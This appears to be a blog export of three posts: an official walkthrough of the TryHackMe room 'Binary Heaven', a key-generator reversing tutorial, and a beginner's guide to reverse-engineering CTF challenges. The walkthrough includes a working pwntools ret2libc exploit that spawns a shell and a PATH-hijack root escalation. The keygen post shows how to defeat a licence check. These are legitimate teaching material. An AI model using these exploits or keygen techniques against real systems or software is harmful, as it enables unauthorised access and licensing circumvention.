[{"content":"THM - Official Binary Heaven Walk-through This is a THM room created by swanandx and Lammm that touches on exploiting binary. This is our first time creating a room and we hope you will enjoy it.\nLink to room: https://tryhackme.com/room/binaryheaven\nTask 1 - Deploy the machine Like what the task suggested, deploy the VM and move on to Task 2.\nTask 2 - Being worthy Upon downloading the task file, we get a zip file credentials.zip. Unzip it and we see 2 files, angel_A and angel_B, let\u0026rsquo;s check them out. Running file command on both file suggest that they are executable. After some blind testing, we can conclude that if ran successfully, angel_A and angel_B should return username and password, respectively.\nNext step, analyze the binaries and figuring out the credentials.We can analyze the binaries using either radare2(CLI tool) or ghidra(GUI application).\nangel_A Start analyzing the binary by running r2 -d -A angel_A. Next, we run afl to list all the functions. Then, if we were to disassemble a certain function, we could run pdf @\u0026lt;function_name\u0026gt;, pdf @sym.main in our case.\nAs you can see in screen shot, it xor every character of our input with 4, and then adds 8 to it. Finally compares it with \u0026ldquo;kym~humr\u0026rdquo;. OR we can look at that address and get the hex values for it.\nwrite a script to first subtract 8 from it and then xor against 4.\nhex_values = [] #list of the values we got using r2 or ghidra username = \u0026#34;\u0026#34; for char in hex_values: username += chr((char - 8) ^ 4) print(username) angel_B Likewise, start analyzing the binary with r2 -d -A angel_B. You might notice that r2 takes forever when it comes to analyzing this binary, reason being is that this is not a binary written in a \u0026ldquo;usual\u0026rdquo; language; it\u0026rsquo;s written in Golang. pdf @sym.main.main to disassemble the main function.\nIf you looked carefully at the function, you would notice that the password is displayed in plain sight, followed by a bunch of gibberish. Supply the password to the binary and we were told Now GO ahead and SSH into heaven.\nUpon SSH into the VM with the credentials we got from earlier, we land at user guardian. Inspect the home directory and grab the guardian_flag.txt.\nTask 3 - Return to the origins There is another binary file named pwn_me and it has SUID bit set for user binexgod. Therefore, a logical assumption at this point would be, exploiting this binary should escalate us to user binexgod.\nIt leaks the address of system, so we can bypass ASLR. Now, we have to find the offset for rip. we can use pwntools cyclic for creating it. Run cyclic \u0026lt;length\u0026gt;\nPut the pattern in temporary file, open the binary in gdb and run it with supplying that pattern. This will cause segfault. Take the value it gave and use cyclic -l value to find the offset\nNow we can automate the remaining ROP chain using pwntools.\nfrom pwn import * elf = context.binary = ELF(\u0026#39;./pwn_me\u0026#39;) libc = elf.libc p = process() #get the leaked address p.recvuntil(\u0026#39;at: \u0026#39;) system_leak = int(p.recvline(), 16) #set our libc address according to the leaked address libc.address = system_leak - libc.sym[\u0026#39;system\u0026#39;] log.success(\u0026#39;LIBC base: {}\u0026#39;.format(hex(libc.address))) #get location of binsh from libc binsh = next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) #build the rop chain rop = ROP(libc) rop.raw(\u0026#39;A\u0026#39; * 32) rop.system(binsh) #send our rop chain p.sendline(rop.chain()) #Get the shell p.interactive() After successfully escalating from guardian to binexgod, we can go ahead and grab the binexgod_flag.txt.\nTask 4 - PATH to root The only thing left for us to do is to privesc to root. We were given a vuln binary alongside its source code vuln.c, let\u0026rsquo;s check them out.\nBy running the vuln binary, we get the output Get out of heaven lol. Let us examine the source code and see what\u0026rsquo;s happening under the hood then.\nWe can see that on line 17, the code is running the echo command specifically from the env variable. Which means this binary is potentially affected by environment variable manipulation attack. Let\u0026rsquo;s give this a try.\nFirst, cd into /tmp directory and create a file called echo.c which contains the following code.\n#include\u0026lt;stdio.h\u0026gt;#include\u0026lt;stdlib.h\u0026gt; int main() { system(\u0026#34;/bin/bash\u0026#34;); } Nothing fancy here, just a C program that upon execute, will give us a bash shell. We then compile this C program by running gcc -o echo echo.c. Note that the output binary must be named echo because we are trying to replace the \u0026ldquo;legit echo\u0026rdquo; binary.\nFinal step, export the /tmp directory to PATH environment variable by running export PATH=/tmp:$PATH. Note that the /tmp directory is placed before everything else, which means if 2 binaries with the same name exist on multiple directories, the system will execute the one mentioned first in the PATH environment variable, in our case, is the /tmp directory.\nAfter completing all the steps above, we run the vuln binary again and we would get root shell successfully!\nTask 5 - Credit Once again, we really thank you for spending time going through the room. We hope you learn something new.\n swanandx#8944, Twitter, THM Lammm#7495, Twitter, THM  ","permalink":"https://swanandx.github.io/blog/posts/writeups/thm/","summary":"THM - Official Binary Heaven Walk-through This is a THM room created by swanandx and Lammm that touches on exploiting binary. This is our first time creating a room and we hope you will enjoy it.\nLink to room: https://tryhackme.com/room/binaryheaven\nTask 1 - Deploy the machine Like what the task suggested, deploy the VM and move on to Task 2.\nTask 2 - Being worthy Upon downloading the task file, we get a zip file credentials.","title":"Binary Heaven Walk-through"},{"content":"What is in this post? You might have seen something like \u0026ldquo;Product Keys\u0026rdquo; for some softwares or some other applications, but how exactly do they verify if the key is correct ? They implement a function that will validate key. We will be reverse engineering a binary, which validates a key using some function, and then we will write a key generator, i.e key-gen, for it to generate valid keys.\nKey checker binary We got a binary that validates our key :\nmain function Lets decompile it using ghidra and look at main function :\nAs we can see, it scans key using scanf and then pass it to validate_key function. Before going ahead, lets see what is the first argument of scanf :\nSo the binary is using scanf(\u0026quot;%d\u0026quot;,\u0026amp;local_14), by this we can say that key will be integer. Now, looking at validate_key function.\nvalidate_key function Here, it will return true if our key is perfectly divisible by 0x4c7 which is 1223 in decimal. Therefore, any number divisible by 1223 is a valid key. Lets verify this :\n As you can see, -1223 is also a valid key, as in the end remainder is 0.\n Now we know the logic, lets write a key generator for this.\nWriting key-gen From the analysis, we know the following:\n Key is a integer. It should be divisible by 1223.  Therefore, we can say, key can range from -2147483647 to 2147483648 as per INT_MIN and INT_MAX in C. But as our key has to be divisible by 1223, our range become -2147482822 to 2147482822,as they are smallest and largest multiple of 1223 in our range.\nMAX_INT = 2147482822 MIN_INT = -2147482822 Then, we generate a random integer in that range by using random\nimport random random_number = random.randint(MIN_INT,MAX_INT) Now, we have a random integer, but we need it to be divisible by 1223. So, we divide the random number by 1223 and then subtract the remainder from it.\nkey = random_number - (random_number % 1223) So, final script becomes,\nimport random MAX_INT = 2147482822 MIN_INT = -2147482822 random_number = random.randint(MIN_INT,MAX_INT) key = random_number - (random_number % 1223) print(key) Lets execute it, and see if it generates valid keys.\nWe did it!! We successfully wrote a key generator that generates valid keys!!\n NOTE : we didn\u0026rsquo;t have any restrictions on length of key, but if there was any, like key length must be 12, then we can just prepend the generated key with 0s till it\u0026rsquo;s length is 12. For example,  Try it yourself! What are you waiting for? Compile some binaries and try to write key-gen for it. This will help you in understanding and will improve scripting skills too.\n","permalink":"https://swanandx.github.io/blog/posts/re/keygen/","summary":"What is in this post? You might have seen something like \u0026ldquo;Product Keys\u0026rdquo; for some softwares or some other applications, but how exactly do they verify if the key is correct ? They implement a function that will validate key. We will be reverse engineering a binary, which validates a key using some function, and then we will write a key generator, i.e key-gen, for it to generate valid keys.","title":"Reversing Binaries: Key generators"},{"content":"What is this about? I saw a lot of people struggling to solve easy reverse engineering (RE) challenges (me too when I was just starting), well, I am not saying I am great at it now, but have really improved my skills so that now I can solve many RE challenges in ctfs. That is why, I am writing this blog, hoping it will help at least a few people.\nBut what is in RE challenges? Basically, in RE challenges, you will be getting an application or executable, of which, we have to find the correct input which will lead to desired output by doing reverse engineering, end goal is to get the flag. I mostly saw the following types of executables:\n Password checker - This will take password as input, and will print flag if password is correct. Flag checker - This will take the flag as input and check if it is correct.  So I got binary in the challenge, now what? We have to basically find the flag , which can be in different formats like THM{}, ictf{}, etc. or just digits, really depending on the challenge.\nI get it, but how? Here is my simple methodology, or path, for solving it.\n You can use radare2 / gdb instead of Ghidra for static analysis too if you are familiar and comfortable with assembly.\n I will elaborate why I choose to do it like that later in the blog.\nstrings strings is very useful yet so simple command.\nAs per manual, it prints the printable characters in a file. So why it is helpful? Well, if the flag is present as printable characters, we can find it straight away. Here is example, suppose I have a binary rev_me\nI ran strings rev_me and found the password and flag :)\nHere is proof,\n.\n why start with strings ? \u0026ndash;\u0026gt; You will find a lot of challenges that can be solved using this single command. If you just run it and found the flag, it will save a lot of your precious time.   NOTE: strings command is also very helpful in malware analysis, check out John Hammond malware analysis videos on YouTube or MAL:strings room on TryHackMe for that.\n ltrace Now what if flag was not in strings? Next place is to trace library calls such as strcmp() if they are being used, we do it by ltrace.\nSyntax is ltrace /path/to/binary It will show the library calls being used like:\n... strcmp('idk','p@ssw0rd') ...  IMP : I did not show example as now-a-days, ltrace is not able to trace calls due to the way in which gcc compiles program. But it still can be useful in ctfs. It only takes 2 sec. to do it, so, always give it a try, we never know.\n  Now lets begin some real cool stuff. Let me first elaborate why I divided challenges in two categories in beginning.\n Password checker This binaries have work flow like:\n1. Take input -\u0026gt; 2. check if input matches the password -\u0026gt; 3. print flag if it matches. Our main goal is to get flag, so instead of figuring out password, we directly jump to code where it prints the flag.\nFor example, I have a binary which prints flag if password is correct. Let us use gdb\nAs you can see, I disassembled the main function. In the main function\nwe are looking for cmp here. we can see it at \u0026lt;+103\u0026gt; . It compares 2 values and if they are equal, it jumps to \u0026lt;main+129\u0026gt;. We can tell that the code at \u0026lt;main+129\u0026gt; prints the flag as it is called if compare is successful, so let\u0026rsquo;s set a breakpoint just after it takes input, i.e. \u0026lt;main+68\u0026gt; and then run it.\nwe supply it with any random password, as we are just going to skip the check anyway. Now, lets jump to \u0026lt;main+129\u0026gt; and see what happens.\nWe successfully got the flag!!\n IMP: same can be done using radare2. instead of jump, use dr rip={address to jump} and then continue it, rest procedure is similar.\n Flag checker Now what if the flag itself is the password? work flow is like\nTake flag as input -\u0026gt; check if it is correct. Now, no use of bypassing the check, as our goal is to get the flag. So how to do it? Let us say we have binary called rev like:\nSo, in order to find flag, I used Ghidra. Open ghidra, create new project and then import the binary.\n You can learn about ghidra more from CC:Ghidra room on TryHackMe or there are many tutorials available for it.\n After analyzing binary, I checked the pseudo code generated by ghidra.\nIn main function, you can see it is xoring every character with 5 and then adding 5 to it , then it is comparing result with flag.\nLet\u0026rsquo;s check what is in flag and take note of those values.\nNow, we know what the result is, let\u0026rsquo;s find what leads to it, for that, write a script that will take character from result then subtract 5 and then xor against 5. We are doing the operations it did to our input in reverse order.\n NOTE: If you wonder why it looks so complicated, well , that is just how ghidra works. Try compiling own binaries and then reversing it to see how ghidra is generating the code.\n flag_bytes = [0x48, 0x4e, 0x49, 0x47, 0x83, 0x82, 0x3a, 0x7c, 0x5f, 0x82, 0x6f, 0x7c, 0x5f, 0x82, 0x3a, 0x7c, 0x7d] flag = \u0026#34;\u0026#34; for x in flag_bytes: flag += chr((x - 5)^5) print(flag) Executing the python script gives the flag!\nLet\u0026rsquo;s verify the flag  IMP : You could have solved the other challenges using ghidra, as it gives the pseudo code which is very helpful. It might be wrong sometimes though. I preferred to use Ghidra in end as it is resource heavy, but if you have resources, you can run it right away.\n What if challenge is not linux executable?  For .NET assembly use ilspy or some other .NET decompiler For .apk, There are a few steps here with different tools, but I just search for online apk decompiler on Google and use online tools. You can also decompile .exe binaries using ghidra.  Wicked cool tricks This are some tricks that I developed through practice\n If you see hex numbers getting assigned to variables in ghidra or something, always look their ASCII value. That might be the flag or password just in front of you. A lot of .java files after decompiling .apk? Suppose flag format is flag{}, just go in directory where there are all .java files and run cat *.java | grep flag{ or you can also try something like grep -iRl flag{. For first time, loops in pseudo code generated by ghidra might look complicated as there are pointers **(int)((long)local28 + 4), don\u0026rsquo;t worry about that much, just focus on our goal and understanding the flow. If there is no main function, look entry function, usually first function called there is __libc_start_main and the first argument to it is usually the main function. If binary prints like wrong, give flag or something, look at which function is responsible for it, that is most probably the main function. I suggest compile some binaries on own and look at how ghidra is generating pseudo code. This will be very helpful in understanding. You can use angr. It is a python framework for analyzing binaries. Check out videos and tutorials for it. I am sure it will worth it.  What next? TL;DR - practice!!\nWe just barely scratched surface of reverse engineering. This is just like a methodology, you need to practice a lot if you want to master it. Different ways of solving challenge, looking at assembly and pseudo code, where to look for flags and what might be rabbit hole etc.\nDo not worry if you think like you are not getting what application is doing or not able to solve challenges, it all comes with practice. There are many awesome resources and many lists of them you can find online, use them to learn more and keep practicing.\n","permalink":"https://swanandx.github.io/blog/posts/re/ctfs/","summary":"What is this about? I saw a lot of people struggling to solve easy reverse engineering (RE) challenges (me too when I was just starting), well, I am not saying I am great at it now, but have really improved my skills so that now I can solve many RE challenges in ctfs. That is why, I am writing this blog, hoping it will help at least a few people.","title":"Reversing Binaries: CTF Edition"}]